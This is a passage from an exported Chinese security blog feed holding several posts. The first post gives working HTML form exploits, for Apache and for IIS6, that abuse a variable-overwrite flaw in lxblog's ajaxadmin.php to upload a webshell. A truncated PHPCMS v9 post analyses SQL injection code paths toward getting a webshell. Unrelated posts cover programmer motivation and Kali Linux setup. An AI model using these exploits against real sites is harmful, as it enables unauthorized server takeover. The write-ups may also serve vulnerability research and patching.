$this-&gt;halt(’Query Error: ’ . $SQL);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;return $query;&nbsp; &nbsp;&nbsp;}` exp:&nbsp; &nbsp; 变量覆盖导致后台getshell&nbsp; 重?文件：/ajaxadmin.php&nbsp; `…..&nbsp; require_once(R_P.’admin/admincp.php’);&nbsp; require_once(R_P.’mod/ajax_mod.php’);//?量覆?了&nbsp; ….&nbsp; } elseif ($action==’upload’) {&nbsp; &nbsp;&nbsp;if ($job == ’add’) {&nbsp; InitGP(array(’uid’,’mode’),’G’);//$uid=1.phtml.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$db_uploadmaxsize = $_GET[’db_uploadmaxsize’];//db_uploadmaxsize=10000&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$db_uploadfiletype = $_GET[’db_uploadfiletype’];//db_uploadfiletype=aaa&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$db_attachnum = $_GET[’db_attachnum’];//db_attachnum=1&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;require_once(R_P.’mod/upload_mod.php’);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$uploaddb = UploadSQL($uid,0,0,’’,$mode);//?入上?，$mode=&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;foreach ($uploaddb as $value) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aid = $value[’aid’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$name = $value[’name’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$size = $value[’size’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$desc = $value[’desc’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url = “$attachpath/$value[attachurl]”;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;echo “&lt;script language=”JavaScript1.2”&gt;parent.UploadFileResponse(’$mode’,’$aid’,’$size’,’$desc’,’$name’,’$url’);&lt;/script&gt;”;exit;&nbsp; &nbsp;&nbsp;}&nbsp; ……&nbsp; function UploadSQL($uid,$itemid,$cid=0,$atype = null,$mode = null){&nbsp; &nbsp;&nbsp;global $db,$attachdb,$timestamp,$atc_content;&nbsp; &nbsp;&nbsp;$uploaddb = !empty($_FILES) ? UploadFile($uid,$mode) : array();//?入uploadfile函?&nbsp; &nbsp;&nbsp;&nbsp; ……&nbsp; function UploadFile($uid,$mode = null){&nbsp; &nbsp;&nbsp;global $_GROUP,$db,$admin_uid,$db_attachnum,$db_uploadmaxsize,$db_uploadfiletype,$timestamp,$db_attachdir,$attachpath,$attachdir,$db_thumbifopen,$db_thumbwh;&nbsp; &nbsp;&nbsp;$filedb = $attachdb = $descdb = array();&nbsp; &nbsp;&nbsp;foreach ($_FILES as $key =&gt; $value) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$i = (int)substr($key,11);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;if (!empty($mode) &amp;&amp; $i != $mode) continue;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$tmp_name = is_array($value) ? $value[’tmp_name’] : ${$key};&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$descdb[$key] = Char_cv($_POST[’atc_desc’.$i]);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$tagdb[$key] = Char_cv($_POST[’atc_tags’.$i]);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$i &gt; 0 &amp;&amp; $i &lt;= $db_attachnum &amp;&amp; if_uploaded_file($tmp_name) &amp;&amp; $filedb[$key] = $value; &nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;unset($_FILES);&nbsp; &nbsp;&nbsp;foreach ($filedb as $key =&gt; $value) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$i = (int)substr($key,11);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;if (is_array($value)) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment = $value[’tmp_name’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_name = $value[’name’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size = $value[’size’];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;} else {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment = ${$key};&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_name = ${$key.’_name’};&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size = ${$key.’_size’};&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$atc_attachment_size &gt; $db_uploadmaxsize &amp;&amp; Uploadmsg(’upload_size_error’,$i);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;@extract($db-&gt;get_one(“SELECT SUM(size) AS tsizes FROM pw_upload WHERE uid=’$admin_uid’”));&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$_GROUP[’uploadsize’] &amp;&amp; $tsizes &gt;= $_GROUP[’uploadsize’] &amp;&amp; Uploadmsg(’upload_size_limit’,$i);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$extdb = explode(’ ’,strtolower($db_uploadfiletype));&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$attach_ext = strtolower(substr(strrchr($atc_attachment_name,’.’),1));&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;(!$attach_ext || !N_InArray($attach_ext,$extdb)) &amp;&amp; Uploadmsg(’upload_type_error’,$i);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$attach_ext = preg_replace(“/(php|asp|jsp|cgi|fcgi|exe|pl|phtml|dll|asa|com|scr|inf)/i”,”scp_\1”,$attach_ext);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$randvar = substr(md5($timestamp+$i),10,15);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$fileurl = “{$uid}_{$randvar}”;//上??接&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;if ($attachdir == R_P.$attachpath) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$savedir = ’’;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ……` 然後我?可?的webshell就上?上去了&nbsp; exp:&nbsp; 适用于apache&nbsp; `&lt;html&gt;&nbsp; &lt;body&gt;&nbsp; &lt;form action=”http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.phtml.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot; method=”post”&nbsp; enctype=”multipart/form-data”&gt;&nbsp; &lt;label for=”attachments1”&gt;Filename:&lt;/label&gt;&nbsp; &lt;input type=”file” name=”attachments1” id=”attachments1” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”admin_uid” value=”2” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”timestamp” value=”a” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”attachdir” value=”./“&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”submit” name=”submit” value=”1.phtml._b923820dcc509a6.aaa” /&gt;&nbsp; &lt;/form&gt;&nbsp; &lt;/body&gt;&nbsp; &lt;/html&gt;` 适用于iis6.0&nbsp; `&lt;html&gt;&nbsp; &lt;body&gt;&nbsp; &lt;form action=”http://127.0.0.1/lxblog/ajaxadmin.php?action=upload&amp;job=add&amp;uid=1.php;.&amp;mode=&amp;db_uploadmaxsize=10000&amp;db_uploadfiletype=aaa&amp;db_attachnum=1&quot; method=”post”&nbsp; enctype=”multipart/form-data”&gt;&nbsp; &lt;label for=”attachments1”&gt;Filename:&lt;/label&gt;&nbsp; &lt;input type=”file” name=”attachments1” id=”attachments1” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”admin_uid” value=”2” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”timestamp” value=”a” /&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”text” name=”attachdir” value=”./“&gt;&nbsp; &lt;br /&gt;&nbsp; &lt;input type=”submit” name=”submit” value=”1.php;._b923820dcc509a6.aaa” /&gt;&nbsp; &lt;/form&gt;&nbsp; &lt;/body&gt;&nbsp; &lt;/html&gt;` 都成功了：&nbsp; &nbsp; 最后的废话：&nbsp; 据说刚开的领域！&nbsp; phpcms v9的补丁打的亮瞎了我的钛合金x眼！&nbsp;]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
        <tag>lxblog</tag>
        <tag>上传</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]走出浮躁的泥沼]]></title>
    <url>%2F2013%2F04%2F11%2F%E8%BD%AC-%E8%B5%B0%E5%87%BA%E6%B5%AE%E8%BA%81%E7%9A%84%E6%B3%A5%E6%B2%BC%2F</url>
    <content type="text"><![CDATA[来源: Veda原型&nbsp;&nbsp;发布时间: 2012-11-27 17:47&nbsp;&nbsp;阅读: 5675 次&nbsp;&nbsp;推荐: 108&nbsp;&nbsp;&nbsp;原文链接&nbsp;&nbsp;&nbsp;[收藏]&nbsp;&nbsp; 关于技术与工作 我觉得，技术与工作最理想的结合状态是，自己能学习到新的技术，这些技术也能应用到工作中；工作的内容又不那么枯燥，都那么具有挑战性。#### 程序员的工作首先应该是富有挑战性的 有这么一句名言：&gt; 工作，它之所以成为工作，是因为你只需要工作而不需要思考。 你也许会对这句话有异议，但是大部分人和大部分工作确实是这样的。工厂员工在流水线上机械地组装，服务员每天重复着招待客人，厨师日复一日地烹制菜肴，等等。工作，就是人和机器之间的中间层，等到某一天机器人有这种功能了，人自然就不用工作了。 但是我觉得，如果你在工作中比别人多那么一点思考，也许你就会出类拔萃，程序员这份工作就是这样。我认为，程序员的工作首先应该是富有挑战性的。但是我见到很多国内的程序员，只是项目完了接着下一个项目，代码重复了一遍又一遍……也许知道代码有问题要重构，系统架构不好要改进，可是没那么多时间啊，天天加班干活，项目时间紧迫。就这么恶性循环，就应了那句话：你说你有5年工作经验，但在我眼里，你不过是将一年的工作经验重复了5年。 程序员的工作是富有挑战性的，但是这个是在国外，在国内，很少真的有程序员，能做到程序结伴，不断挑战新的高度。大多数是年轻的时候努力奋斗了几年，到后来，因为本方向的发展空间不是很大了，但是又不能跳转到其他的方向，怎么办呢，带几个新人吧，这样也有点领导的性质了。但是，有没有想过，大学研究生读了这么多年，工作写了这么多代码，突然有一天不写了，转做项目管理了。这也就是中国的IT的现状，工作几年之后大家都痛苦地抛弃了代码，抛弃了自己以前的很多代码积累。#### 程序员的工作与赚钱 我们出去工作，说到底，最根本的目的就是赚钱。但是，我们不能因为赚钱，而丢弃自己的信仰。 先来来看看这个一个故事吧： 照片上那个戴墨镜的哥们， 叫 Nicholas McGuire， 是兰州大学的客座教授。看到这个照片，和我一样，一定有无数多的问题， 我一个一个帮你问，然后解答吧。 你可能会奇怪，这么郑重的场合， 他为什么戴墨镜？ 耍酷吗 ？ 答：其实不是耍酷，Nicholas 其实是一个半盲人。 别人都是西装，他为什么只有衬衣 ？耍酷吗？ 答：其实不是耍酷， Nicholas 真的没有西装，他穿的那身，是他能找到的最好的衣服。 他到兰州大学研究什么的？ 是研究戈壁生态， 还是沙漠治理，还是兰州拉面 ？ 答：其实都不是，他研究开源的嵌入式实时操作系统??RTLinux， 以及与此相关的一切开源软件以及嵌入式系统，是&nbsp;RTLinux&nbsp;的内核代码管理员之一，不折不扣的高科技。 他是兰州大学高薪聘请来的吗？ 答：没有高薪，事实上，一直连薪水都没有，直到今年，才申请了一些。 他是不是每年来兰州一两个月，就当是度假？ 答：不是，他实实在在在兰州大学呆 10 个月， 只有 2 个月回德国老家度假。 他是不是只这样做了 1 两年. 答: 不是，他从 2005 年开始，直到现在，一直这样。 他图什么 ？ 答:&nbsp;因为兰州大学有一个叫周庆国的老师以及小组， 不停地向 RTLinux 的内核提交代码。他去兰州大学，就是要和他们一起工作。 兰州大学的学生英语如何？能和他一起工作吗？ 答: 他和兰州大学的学生， 无论是生活都是开会还是写文档，通通遵循开源社区的标准， 用英语交流，木有问题。 为什么选择兰州大学？ 答：因为兰州大学有一个叫周庆国的老师以及小组， 不停地向 RTLinux 的内核提交代码。 周庆国老师拿到过国家项目的资助吗？比如发展开源软件基金，红旗 linux 神马滴。 答：几乎没有，兰州地处西部，离北京很远，拿到项目很难，他能作的就是不停地研究代码，提交代码，向开源社区贡献代码。 这个与赛灵思有神马关系？ 答: 当他听说赛灵思的在 ZYNQ 的 QEMU 模型上跑的开源 Linux 内核推出了，并且发布在 wiki.xilinx.com 上，立即就开始下载研究，跑起来， 即没有要项目经费，也没有要资助和捐赠，因为在开源人的眼里??无论是开源软件还是开源硬件，开源就象信仰一样，无需证明。 看完这个故事有什么感想吗？ 不是每一个程序员都要成为比尔?盖茨，都要建立商业帝国成为世界首富。也不是每一个程序员都要做马化腾，建立QQ帝国君临天下。但是我觉得，每个程序员都应该向Dennis Ritchie（C语言之父）学习，在贝尔实验室默默为计算机界奋斗一生。每个程序员都应该向Linus Torvalds学习，写出改变计算机世界的Linux但却不争名夺利。比尔?盖茨、马化腾是IT商业化的代表，而Dennis Ritchie和Linus Torvalds则是计算机界学者的先驱。 台湾作家龙应台说了这么一句话：你可以选择做官，你也可以选择挣钱，但你不能选择通过做官来挣钱。 同样的，对程序员而言，你可以选择研究技术，也可以选择赚钱。但是以赚钱的心态去做程序员，那么你也许会品尝不到技术的很多快乐。程序员是一个职业，一个专业的职业，那么作为一个程序员应该有一个专业上的目标，赚多少钱和程序员的专业素养没有关系，你可以把赚多少钱开宝马作为人生的目标，但是你作为程序员的目标不应该是赚钱。可以这么说，现在行业内的程序员很多都不是真正的程序员，对那些做着程序员工作的代码工人来说，程序员只是一个混口饭吃的工作而已，那么工作的目的就是赚钱，盯着钱看就没什么不对了。人生目标和自己的专业目标分不清楚，难怪哪头都讨不到好。专业和职业是两码事，专业关注的是你做事的能力，职业关系的是你在公司的职位，这个东西理不清楚就只能是两头不讨好。真正的程序员应该是个热爱技术的Geek，喜欢创造与挑战，享受技术带来的喜悦与创造带来的成就感，而非不断编写着一遍又一遍重复code的码农。 作为程序员应该追求的是自己专业素养上的提升，作为一个职员应该向着高薪努力，当然有的程序员自己又是老板，比如康盛创想的戴志康 ，那么作为老板又有另外的追求了。我觉得作为一个程序员，在一个程序员的社区里应该关注的是自己的专业而不是在这里大谈程序员怎么怎么赚不到钱。 也许，每一个程序员在开始的时候都想过要写出非常牛逼的程序，做个人人崇拜的高手，直到有一天，他发现他的代码并不能改变世界的时候，就会向现实屈服，甚至抛弃往昔自己喜欢的编程。 与程序打交道，是我们选择的工作，也是我们选择的职业。程序员，应该是一个值得骄傲的称号，而非是码农的代名词。走出浮躁的泥沼，我们会找到另外一个不同的自己。 学会享受学习过程的乐趣 学习是一辈子的事情，对于程序员来说更是如此，所以如果没有学会享受学习过程的乐趣，那么学习将会是你人生的一个重压。 以学习数据结构为例。大家都知道，对于程序员而言，数据结构是基础，是必须学会的课程。但是现在很多语言，细节都封装得很好，比如Java、.Net、PHP，几乎都不需要你用到多少数据结构与算法的知识，以致于很多人觉得，我就不会数据结构，我还不一样好好工作吗？这就是浮躁的开始了。 的确，对大部分程序员来说，工作上很多时候不需要用到数据结构。但是你会发现，工作若干年后，你的技术水平会停滞不前，做的东西总是CURD，再加上一点设计模式，再者可能有NoSQL、memcache之类的应用。但是，当你写这些代码写到疲软的时候，你会发现这些都是应用层面的东西，别人做好的现成的东西，到你想理解它们底层与原理的时候，没有数据结构与算法的知识支撑，你会很吃力。勿在浮沙筑高台，尽管你开源软件用得多好，如果不去理解计算机的底层，顶多也就是个高级点的码农。 要走出浮躁的泥沼，只要理解一句话就行：&gt; 学习的真正乐趣不是因为它有用，而是因为学习的过程本身有趣。 所以你需要去发现学习过程有哪些乐趣，还是拿数据结构的学习为例。 1. 数据结构的学习在短期内不会对工作有什么效果，但它是对未来以及自己的投资。学习它你一定不要浮躁，不要觉得它短期内收益不大就不去学习。摒弃浮躁的第一步就是，不要带着功利的眼光去学习。 2. 数据结构的学习几乎都是从线性表开始，然后讲到最重要的单链表。单链表的基本操作就建表、插入、删除、查找等，如果你把这些操作都学完了，是不是该立即进入堆栈的学习呢？我的建议是，不。“学习”是一个实际上不应该分割的词汇，只有“学”没有“习”将必然导致肤浅。当学完单链表的基本操作，你需要做更多的“习”。这时候你需要尝试着研究下面的问题：单链表的逆序、求单链表的倒数第N个元素、单链表的排序、单链表的环……等等。当你对单链表的学习进入某种境界，才进入堆栈的学习，这样你的单链表就很扎实，同时学习堆栈也会变得很有效率。你可以参考我之前所做的专题：《数据结构物语卷二》 千万不要觉得这很浪费时间。左学点右学点，散沙式的学习才浪费时间，连续的思考才是高效的。 3. 享受思考的乐趣。数据结构一开始学也许你会觉得有点难，比如插入一个数据都要涉及几个结点的地址操作，但是当你思考并完全理解为什么这么做，你会有一种豁然开朗的感觉。并且更重要的是，每解决一个单链表的问题，就相当于做了一次思维训练。思维训练做得多了，对单链表的理解就更深了，以后解决问题就更快。我们可以这么认为，每做一次思维训练，都能够使我们的思维加速，使我们的大脑加速。为什么牛人一看问题就能知道如何解决？很简单，因为他做过普通人无法想象的大量的思维训练，正如巴菲特7岁就开始拜师学投资一样。没有人天生就是大牛，对吧？ 4. 关于学习的欲望。很多人心里知道，我要学习，但是总是容易被分心。一会看看微博，一会折腾下其它什么东西，结果半天还没看得进一点东西。不要假学习，不要为不学习找理由，没钱？没时间？累？只要你内心坚定且欲望强烈，就会主动学习。 可以看看这篇文章：另外八小时，用辛勤换幸福。如果能把写博当作是一种放松，如果能把写博当作一种享受，不带任何功利的杂质，那么你就会非常强烈地想去写博。（对我来说，写博就是学习） 你可以尝试下早上6点半起来，学习一个小时再去上班，效果很好。这篇文章就是我早上6点多开始写的。学习大部分时间是一个人的活动，难免会有孤独感，当你精力高度集中时，孤独感会减少。当你全神贯注的时候，甚至会感到身心愉悦。“耐得寂寞不寂寞，耐不住寂寞反寂寞。” 5. 不要被厚厚的书吓住。有的人也许会说，你看，数据结构那么多章节，你光单链表这一章就做了一百多个练习，花了一两个月，什么时候才能看得完啊？我说，学习没人逼你进度，随意看，什么时候觉得自己精通了再转入下一个学习阶段。过早地进入下一个阶段只会让你过早地忘记前面的知识，比如草草地看了单链表的基本操作，就去学堆栈，过一个星期我问你单链表的反转，你也许就会一时想不出。所以我认为：&gt; 坚持做一件事，直到达到一个境界??至于是什么境界，我不知道，你才知道??然后才开始做另外一件事。 6. 你对学习有如饥似渴的感觉吗？对待学习，我很推崇完美主义。比如单链表的基本操作弄懂了，写程序过了一遍，然后开始研究它的各种常见操作。都研究完了，开始研究比较少见的操作，带头结点与不带头结点的都要过一遍。然后翻遍互联网，看看有没自己疏漏的。发现有疏漏的，你会很高兴，马上再写程序自己过一遍。直到Google搜索“单链表”前100页的结果你都能马上知道什么回事，知道怎么做，嗯，那就差不多了。 很疯狂吗？在常人看来也许是。但是对我们自己来说，不这么做，很难达到某种境界，或者说，精通。对知识的如饥似渴的时候，当得到新的发现新的知识，你会得到很大的满足感，而且一路走来的成就感，也是对你之前努力的最大回报。 那么，从现在开始，逃离浮躁的泥沼，享受学习过程的乐趣。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《桃源》杂志 第六期 下载]]></title>
    <url>%2F2013%2F03%2F30%2F%E3%80%8A%E6%A1%83%E6%BA%90%E3%80%8B%E6%9D%82%E5%BF%97-%E7%AC%AC%E5%85%AD%E6%9C%9F-%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>《桃源》</tag>
        <tag>三叶草</tag>
        <tag>杂志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali linux 安装遇到的一些问题]]></title>
    <url>%2F2013%2F03%2F17%2Fkali-linux-%E5%AE%89%E8%A3%85%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 据说kali linux 是bt的儿子，于是下载了一个vm版的体验了一下，感觉不错，于是装在了笔记本上，体验了下真不错，于是想装在台式机上直接作为主系统， &nbsp;&nbsp;&nbsp; 安装的过程中遇到了两个问题，第一个是系统缺失一些文件，直接google下载相应的deb &nbsp;&nbsp;&nbsp; 第二个是显卡驱动问题，它自带的nouveau取得错误 &nbsp;&nbsp;&nbsp; 我现进入恢复模式关闭mouveau &nbsp;&nbsp;&nbsp; 具体步骤： &nbsp;&nbsp;&nbsp;&nbsp;root@bt~# echo options nouveau modeset=0 | sudo tee -a/etc/modprobe.d/nouveau-kms.conf &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;//&amp;#42在modprobe.d下建立nouveau-kms.conf文件,并写入options nouveau modeset=0这句&amp;#42// &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;root@bt~# update-initramfs -u &nbsp;&nbsp;&nbsp; 在执行update-initramfs -u的时候报错缺失一些网卡驱动文件，于是同上百度下载deb安装 &nbsp;&nbsp;&nbsp; 但是安装的时候又出错了，说是不能覆盖源程序，所以我直接解压deb提取相关文件复制到相关目录 &nbsp;&nbsp;&nbsp; 然后再执行 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;update-initramfs -u &nbsp;&nbsp;&nbsp; 成功 &nbsp;&nbsp;&nbsp; 然后reboot重启 &nbsp;&nbsp;&nbsp; 重启后进入正常模式更新相关内核 &nbsp;&nbsp;&nbsp;&nbsp;apt-get install linux-headers-$(uname -r) &nbsp;&nbsp;&nbsp; 然后直接安装官网的驱动 &nbsp;&nbsp;&nbsp; 启动起来过后直接ok &nbsp;&nbsp;&nbsp; kali有自带的中文语言包不用自己汉化了 &nbsp;&nbsp;&nbsp; 更新163的软件源，他自带的debian的源没法访问 &nbsp;&nbsp;&nbsp; 然后装输入发scim &nbsp;&nbsp;&nbsp;&nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS v9 的那些注入和getwebshell]]></title>
    <url>%2F2013%2F03%2F05%2FPHPCMS-v9-%E7%9A%84%E9%82%A3%E4%BA%9B%E6%B3%A8%E5%85%A5%E5%92%8Cgetwebshell%2F</url>
    <content type="text"><![CDATA[PHPCMS&nbsp;v9&nbsp;注入和getwebshell&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x00&nbsp;前言&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x01&nbsp;新年左右的注入&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x02&nbsp;绕过厂商的补丁&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x03&nbsp;破不开的密码&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x04&nbsp;曾经的getwebshell&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x05&nbsp;补漏了apache&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x06&nbsp;Exploit编写&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x07&nbsp;结束语&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x00&nbsp;前言&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;PHPCMS&nbsp;V9（后面简称V9）采用PHP5+MYSQL做为技术基础进行开发。V9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。&nbsp;5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。&nbsp;&lt;o:p&gt;&lt;/o:p&gt;V9在保留2008版的特点的同时，对新版本作出重大的创新，以期待全新的PHPCMS系统服务更多的用户。（以上复制的官网简介）&lt;o:p&gt;&lt;/o:p&gt;新年到来的时候wooyun和t00ls上都有把phpcms&nbsp;v9的漏洞作为新年礼物发布出来和大家分享，我也去下载了最新的phpcms&nbsp;v9的程序分析了下代码，在此把一些菜鸟的心得说给大家听下，望大家指正。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x01&nbsp;新年左右的注入&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;1.短消息回复注入&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;/phpcms/modules/message/index.phppublic function reply() {if(isset($_POST[’dosubmit’])) {$messageid = intval($_POST[’info’][’replyid’]);//判断当前会员，是否可发，短消息．$this-&gt;message_db-&gt;messagecheck($this-&gt;_userid); //检查此消息是否有权限回复$this-&gt;check_user($messageid,’to’);$_POST[’info’][’send_from_id’] = $this-&gt;_username;$_POST[’info’][’message_time’] = SYS_TIME;$_POST[’info’][’status’] = ’1’;$_POST[’info’][’folder’] = ’inbox’;$_POST[’info’][’content’] = safe_replace($_POST[’info’][’content’]);$_POST[’info’][’subject’] = safe_replace($_POST[’info’][’subject’]);if(empty($_POST[’info’][’send_to_id’])) {howmessage(L(’user_noempty’),HTTP_REFERER);}$messageid = $this-&gt;message_db-&gt;insert($_POST[’info’],true);//这儿数据传入 if(!$messageid) return FALSE;showmessage(L(’operation_success’),HTTP_REFERER);} else {$show_validator = $show_scroll = $show_header = true;include template(’message’, ’send’);}}&lt;o:p&gt;&lt;/o:p&gt;上边把POST数据直接传入了insert函数&lt;o:p&gt;&lt;/o:p&gt;Mysql.class.php中:&lt;o:p&gt;&lt;/o:p&gt;public function insert($data, $table, $return_insert_id = false, $replace = false) {if(!is_array( $data ) || $table == ’’ || count($data) == 0) { return false; } $fielddata = array_keys($data);//这儿直接以数组下标作为字段 $valuedata = array_values($data); array_walk($fielddata, array($this, ’add_special_char’));//到了关键地方，关键的过滤函数add_special_chararray_walk($valuedata, array($this, ’escape_string’)); $field = implode (’,’, $fielddata); $value = implode (’,’, $valuedata); $cmd = $replace ? ’REPLACE INTO’ : ’INSERT INTO’; $sql = $cmd.’ ’.$this-&amp;gt;config[’database’].’.’.$table.’(’.$field.’) VALUES (’.$value.’)’; $return = $this-&gt;execute($sql);return $return_insert_id ? $this-&gt;insert_id() : $return;}漏洞函数出现了：&lt;o:p&gt;&lt;/o:p&gt;public function add_special_char(&amp;$value) {if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’’)) { //不处理包含&amp;#42 或者 使用了sql方法。 } else { $value = ’’.trim($value).’’; } return $value; }&lt;/pre&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;上边过滤函数没有有效过滤&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;2.&lt;span style=&quot;font-family:宋体;&quot;&gt;生日修改注入&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;漏洞函数&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;pre class=&quot;brush:php; toolbar: true; auto-links: 